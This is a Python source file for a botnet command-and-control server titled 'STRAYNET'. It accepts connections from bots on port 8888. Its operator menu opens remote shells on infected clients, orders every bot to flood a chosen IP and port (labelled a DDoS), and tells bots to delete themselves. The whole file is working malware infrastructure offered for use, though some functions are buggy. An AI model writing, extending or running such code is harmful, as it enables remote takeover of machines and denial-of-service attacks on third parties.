import asyncio
import aioconsole
import os
import sys
import json
from rich.console import Console

HOST = "0.0.0.0"
PORT = 8888

is_flooding = False

console = Console(highlight=False)
server:asyncio.Server = None

writer:asyncio.StreamWriter = None
reader:asyncio.StreamReader = None

prompt_prefix = "server:~$ "
shell_prompt_prefix = "> "
title = r"""
███████╗████████╗██████╗  █████╗ ██╗   ██╗███╗   ██╗███████╗████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
███████╗   ██║   ██████╔╝███████║ ╚████╔╝ ██╔██╗ ██║█████╗     ██║   
╚════██║   ██║   ██╔══██╗██╔══██║  ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
███████║   ██║   ██║  ██║██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
                      [cyan]Created by User ;) ~ v1[/cyan]     
"""

class Client():
    def __init__(self, id:str=None, ip:str=None, writer:asyncio.StreamWriter=None, reader:asyncio.StreamReader=None):
        self.id = id
        self.ip = ip
        self.writer = writer
        self.reader = reader

clients: list[Client] = []

#? Remove everything displayed in the terminal
def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

#? Get the client from an ID
def get_client_from_id(input_id:int):
    try:
        for c in clients:
            if int(c.id) == int(input_id):
                return c
    except:
        console.print("[red](-)Client wasn't found[/red]")
        
def get_arg(tokens:list, arg_token:str):
    return str(tokens[tokens.index(arg_token) + 1])

#? The main part of the program, from here the user will control everything (commands, bots, etc)
async def main_gui():
    clear_screen()
    console.print(f"[bright_red]{title}[/bright_red]")
    console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
    console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")
    
    while True:
        command = await aioconsole.ainput(f"\n{prompt_prefix}")
        await parse_command(command)

#? Parse commands to client
async def parse_command(command:str):
    try:
        tokens = command.split()
        if not tokens:
            console.print("[red](-) No command was input[/red]")
        
        command = tokens[0]
        if command == "help":
            console.print("[INSERT HELP]")
        elif command == "clear":
            clear_screen_to_menu()
        elif command == "ls":
            await list_clients()
        elif command == "info":
            await get_info(tokens)
        elif command == "rm":
            await do_remove(tokens)
        elif command == "flood":
            await flood(tokens)
        elif command == "stop_flood":
            await stop_flood()
        elif command == "shell":
            await shell(tokens)
        elif command == "quit":
            sys.exit()
        else:
            console.print("[red](-) Command not found[/red]")
    except:
        pass

#? Run a shell
async def shell(tokens):
    client = get_client_from_id(get_arg(tokens, "-id"))
    console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with ^Z[/cyan]")
    
    while True:
        command = await aioconsole.ainput(f"\n{shell_prompt_prefix}")
        
        if command == "^Z":
            break
        
        client.writer.write(f"shell {command}".encode())
        response = await reader.read(1024)
        response = response.decode()
        response = response.split()
        response = " ".join(response)
        
        console.print(f"[cyan]{response}[/cyan]")
        
#? Remove everything, then print out the menu
def clear_screen_to_menu():
        clear_screen()
        console.print(f"[bright_red]{title}[/bright_red]")
        console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
        console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")

#? Prints out a list of all connected clients
async def list_clients():
    console.print(f"[cyan]Bots: {len(clients)}")
    for c in clients:
        console.print(f"[cyan]ID: {c.id}    IP: {c.ip}[/cyan]")

#? Prints info on the client, such as ip, os, etc
async def get_info(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        console.print(f"[cyan]Client ID: {client.id}[/cyan]")
        console.print(f"[cyan]IP: {client.ip}[/cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting error: 'interact -id (USER_ID)'[/red]")

#? Remove the client from the server
async def do_remove(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        client.writer.write("delete_self".encode())
        await client.writer.drain()
        client.writer.close()
        console.print("[cyan](*) Removed user[cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting error: 'remove -id (USER_ID)'[/red]")

#? Start a flood attack (DDOS)
async def flood(tokens:list):
    global is_flooding
    try:
        if is_flooding:
            console.print("[cyan](*) A flooding attack is already happening, stop it with 'stop_flood'[/cyan]")
            return
        
        if tokens.index("-ip") and tokens.index("-port"):
            pass
        
        tokens = " ".join(tokens)
        for c in clients:
            c.writer.write(str(tokens).encode())
            await c.writer.drain()
            
        console.print("[cyan](*) Flooding attack started[/cyan]")
        is_flooding = True
    except (ValueError, IndexError):
        console.print("[red](-) Formatting Error: 'flood -ip (IP ADDRESS) -port (PORT)'[/red]")

#? Stops the flood attack (DDOS)
async def stop_flood():
    global is_flooding
    try:
        if not is_flooding:
            console.print("[cyan](*) There is no flooding attack currently ongoing[/cyan]")
            return
        
        for c in clients:
            c.writer.write("stop_flood".encode())
            await c.writer.drain()
        
        console.print("[cyan](*) Flooding attack stopped[/cyan]")
        is_flooding = False
    except Exception as e:
        console.print(f"[red](-) Error: {e}[/red]")

#? Gets called whenever a client connects
async def handle_client(_reader:asyncio.StreamReader, _writer:asyncio.StreamWriter):
    global reader, writer
    reader = _reader
    writer = _writer
    
    try:
        id = len(clients) + 1
        ip = writer.get_extra_info("peername")
        client = Client(id, ip, writer, reader)
        clients.append(client)
        await writer.wait_closed()
    except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError):
        pass
    except Exception as e:
        pass
    finally:
        clients.remove(client)
        writer.close()
        
#? Start server + keep it going forever
async def start_server():
    global server
    server = await asyncio.start_server(handle_client, HOST, PORT)
    await asyncio.gather(main_gui(), server.serve_forever())
    
async def start_screen():
    try:
        clear_screen()
        console.print(f"[bright_red]{title}[/bright_red]\n")
        console.print("[bright_red]COMMANDS:\n- [cyan]'start'[/cyan] starts server\n- [cyan]'exit'[/cyan] exits the program[/bright_red]")
        while True:
            user_input:str = input(f"\n{prompt_prefix}").lower()
            
            if user_input == "start":
                await start_server()
            elif user_input == "exit":
                sys.exit()
            else:
                console.print("[red](-) Command not found[/red]")
    except:
        pass
    
if __name__ == "__main__":
    try:
        asyncio.run(start_screen())
    except:
        pass